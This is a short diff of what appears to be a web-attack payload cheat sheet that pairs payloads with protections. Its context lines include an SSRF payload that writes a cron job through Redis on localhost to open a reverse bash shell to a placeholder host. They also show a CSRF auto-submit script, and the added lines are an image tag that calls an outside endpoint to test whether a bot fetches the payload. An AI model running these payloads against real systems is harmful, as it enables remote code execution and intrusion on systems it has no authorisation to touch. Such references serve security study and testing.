@@ -519,6 +519,9 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 <script>
  document.getElementById("autosubmit").submit();
 </script>
+
+<-- testing if the payload is read by the bot -->
+<img src=http://<endpoint>/logoo.jpg>
 ```
 
 `Protection:`
